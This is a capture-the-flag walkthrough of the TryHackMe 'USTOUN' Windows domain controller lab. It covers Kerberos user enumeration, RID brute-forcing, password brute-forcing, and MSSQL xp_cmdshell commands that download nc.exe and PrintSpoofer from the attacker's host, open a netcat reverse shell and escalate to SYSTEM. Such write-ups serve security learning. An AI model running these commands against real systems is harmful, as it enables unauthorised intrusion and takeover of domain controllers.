---
layout: post
title:  "TryHackMe - USTOUN"
date:   2021-04-15 10:10:05 +0300
categories: [tryhackme,walkthrough]
pin: true
tags: [kerbrute,crackmapexec,nmap,windows,Active Directory,printspoofer,SetImpersonatePrivilege,powershell]
image: /images/u.png
---

## USTOUN - TryHackMe

## Port Scan
```sh
┌──(alienum㉿kali)-[~]
└─$ sudo nmap -sS -A -O 10.10.44.186  -p-
PORT      STATE SERVICE        VERSION
88/tcp    open  kerberos-sec   Microsoft Windows Kerberos (server time: 2021-04-03 12:04:19Z)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open  ldap           Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s?
3268/tcp  open  ldap           Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: DC01
|   NetBIOS_Domain_Name: DC01
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: ustoun.local
|   DNS_Computer_Name: DC.ustoun.local
|   DNS_Tree_Name: ustoun.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-04-03T12:07:29+00:00
| ssl-cert: Subject: commonName=DC.ustoun.local
| Not valid before: 2021-01-31T19:39:34
|_Not valid after:  2021-08-02T19:39:34
|_ssl-date: 2021-04-03T12:08:17+00:00; +2s from scanner time.
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf         .NET Message Framing
47001/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc          Microsoft Windows RPC
49673/tcp open  msrpc          Microsoft Windows RPC
49688/tcp open  msrpc          Microsoft Windows RPC
49708/tcp open  msrpc          Microsoft Windows RPC
49713/tcp open  msrpc          Microsoft Windows RPC
49725/tcp open  msrpc          Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/3%OT=88%CT=1%CU=38928%PV=Y%DS=4%DC=T%G=Y%TM=60685B1B
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=U
OS:)OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%
OS:O6=M505NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%D
OS:F=Y%T=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=
OS:Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z
OS:)

Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
|_smb2-security-mode: SMB: Couldnt find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   311.62 ms 10.4.0.1 (10.4.0.1)
2   ... 3
4   582.77 ms 10.10.44.186 (10.10.44.186)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1851.51 seconds
```

- Note add to `/etc/hosts` the `ustoun.local`

## Kerbrute | Enum Users
```sh
┌──(alienum㉿kali)-[~/kerbrute-ropnop]
└─$ ./kerbrute_linux_amd64 userenum -d ustoun.local --dc ustoun.local /usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 04/15/21 - Ronnie Flathers @ropnop

2021/04/15 14:07:37 >  Using KDC(s):
2021/04/15 14:07:37 >  	ustoun.local:88

2021/04/15 14:07:41 >  [+] VALID USERNAME:	 ADMINISTRATOR@ustoun.local
2021/04/15 14:07:43 >  [+] VALID USERNAME:	 Administrator@ustoun.local
2021/04/15 14:07:53 >  [+] VALID USERNAME:	 Guest@ustoun.local
2021/04/15 14:07:53 >  [+] VALID USERNAME:	 GUEST@ustoun.local
2021/04/15 14:08:21 >  [+] VALID USERNAME:	 administrator@ustoun.local
2021/04/15 14:08:30 >  [+] VALID USERNAME:	 guest@ustoun.local
2021/04/15 14:08:54 >  Done! Tested 827 usernames (6 valid) in 77.442 seconds
```

- So we got 2 valid users `administrator` and `guest`


## What is RID ?

-  RID means `Relative Identifier`

- Theory

 The *relative identifier* (RID) is a variable length number that is assigned to objects at creation and becomes part of the objects [Security Identifier] (SID) that uniquely identifies an account or group within a domain. The Relative ID Master allocates security RIDs to Domain Controllers to assign to new Active Directory security principals (users, groups or computer objects). It also manages objects moving between domains.

## Wha is SID ?

 - Theory

The **SID** (Security IDentifier) is a unique ID number that a computer or domain controller uses to identify you. It is a string of alphanumeric characters assigned to each user on a Windows computer, or to each user, group, and computer on a domain-controlled network.

## Crackmapexec

 ```sh
┌──(alienum㉿kali)-[~/kerbrute-ropnop]
└─$ crackmapexec smb ustoun.local -u guest -p '' --rid-brute
SMB         10.10.138.186   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.138.186   445    DC               [+] ustoun.local\guest:
SMB         10.10.138.186   445    DC               [+] Brute forcing RIDs
SMB         10.10.138.186   445    DC               498: DC01\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.138.186   445    DC               500: DC01\Administrator (SidTypeUser)
SMB         10.10.138.186   445    DC               501: DC01\Guest (SidTypeUser)
SMB         10.10.138.186   445    DC               502: DC01\krbtgt (SidTypeUser)
SMB         10.10.138.186   445    DC               512: DC01\Domain Admins (SidTypeGroup)
SMB         10.10.138.186   445    DC               513: DC01\Domain Users (SidTypeGroup)
SMB         10.10.138.186   445    DC               514: DC01\Domain Guests (SidTypeGroup)
SMB         10.10.138.186   445    DC               515: DC01\Domain Computers (SidTypeGroup)
SMB         10.10.138.186   445    DC               516: DC01\Domain Controllers (SidTypeGroup)
SMB         10.10.138.186   445    DC               517: DC01\Cert Publishers (SidTypeAlias)
SMB         10.10.138.186   445    DC               518: DC01\Schema Admins (SidTypeGroup)
SMB         10.10.138.186   445    DC               519: DC01\Enterprise Admins (SidTypeGroup)
SMB         10.10.138.186   445    DC               520: DC01\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.138.186   445    DC               521: DC01\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.138.186   445    DC               522: DC01\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.138.186   445    DC               525: DC01\Protected Users (SidTypeGroup)
SMB         10.10.138.186   445    DC               526: DC01\Key Admins (SidTypeGroup)
SMB         10.10.138.186   445    DC               527: DC01\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.138.186   445    DC               553: DC01\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.138.186   445    DC               571: DC01\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.138.186   445    DC               572: DC01\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.138.186   445    DC               1000: DC01\DC$ (SidTypeUser)
SMB         10.10.138.186   445    DC               1101: DC01\DnsAdmins (SidTypeAlias)
SMB         10.10.138.186   445    DC               1102: DC01\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.138.186   445    DC               1112: DC01\SVC-Kerb (SidTypeUser)
SMB         10.10.138.186   445    DC               1114: DC01\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
 ```

The  `SidTypeUser` represents the users. So we found two more users.

1. `SVC-Kerb`
2. `krbtgt`

## Crackmapexec | Bruteforce

- User `SVC-Kerb`

```sh
┌──(alienum㉿kali)-[~]
└─$ crackmapexec smb ustoun.local -u SVC-Kerb  -p /usr/share/wordlists/rockyou.txt
SMB         10.10.138.186   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.138.186   445    DC               [-] ustoun.local\SVC-Kerb:123456 STATUS_LOGON_FAILURE
SMB         10.10.138.186   445    DC               [-] ustoun.local\SVC-Kerb:12345 STATUS_LOGON_FAILURE
SMB         10.10.138.186   445    DC               [-] ustoun.local\SVC-Kerb:123456789 STATUS_LOGON_FAILURE
SMB         10.10.138.186   445    DC               [-] ustoun.local\SVC-Kerb:password STATUS_LOGON_FAILURE
...
SMB         10.10.138.186   445    DC               [+] ustoun.local\SVC-Kerb:s******n
```

- Credentials `SVC-Kerb` : `s******n`
## impacket | mssqlclient

```#!/bin/sh
┌──(alienum㉿kali)-[~]
└─$ locate mssqlclient
/usr/share/doc/python3-impacket/examples/mssqlclient.py
```

## mssqlclient

```#!/bin/sh
┌──(alienum㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ustoun.local/svc-kerb:s******n@10.10.83.216
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC): Line 1: Changed database context to 'master'.
[*] INFO(DC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL> xp_cmdshell "whoami"

output                                                                             

--------------------------------------------------------------------------------   

dc01\svc-kerb
```

## Uploading the nc.exe

- Create dir named `tmp` under the `C:\`

```sql
EXEC xp_cmdshell 'mkdir C:\tmp'
```

- Curl the `nc.exe` from our vm

```sql
EXEC xp_cmdshell 'powershell -c curl http://10.8.28.219/nc.exe -o C:\tmp\nc.exe'
```

- Listener

```sh
┌──(alienum㉿kali)-[~]
└─$ locate nc.exe     
/usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe

┌──(alienum㉿kali)-[~]
└─$ cd /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/

┌──(alienum㉿kali)-[/usr/…/wordlists/SecLists/Web-Shells/FuzzDB]
└─$ sudo python3 -m http.server 80
[sudo] password for alienum:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.83.216 - - [15/Apr/2021 23:01:53] "GET /nc.exe HTTP/1.1" 200 -
```

- Execute the `nc.exe`

```sql
EXEC xp_cmdshell 'C:\tmp\nc.exe -e cmd 10.8.28.219 4444'
```

![image]( /assets/img/ustoun/1.PNG)

## Privilege Escalation

- Run the command `whoami /priv`

The `/priv` represents the Privileges that the current user have

```sh
# whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
#
```

## SetImpersonatePrivilege

After a google search i found that the `PrintSpoofer` tool can exploit the `SetImpersonatePrivilege`
Check here the original blog : [printspoofer-abusing-impersonate-privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

Download the exe here [PrintSpoofer.exe](https://github.com/dievus/printspoofer)

## Download the printspoofer
```sh
powershell -c curl http://10.8.28.219:81/PrintSpoofer.exe -o C:\tmp\printspoofer.exe
```

![image]( /assets/img/ustoun/2.PNG)

## Run the script
```sh
printspoofer.exe -i -c powershell
```

## Rooted

![image]( /assets/img/ustoun/3.PNG)
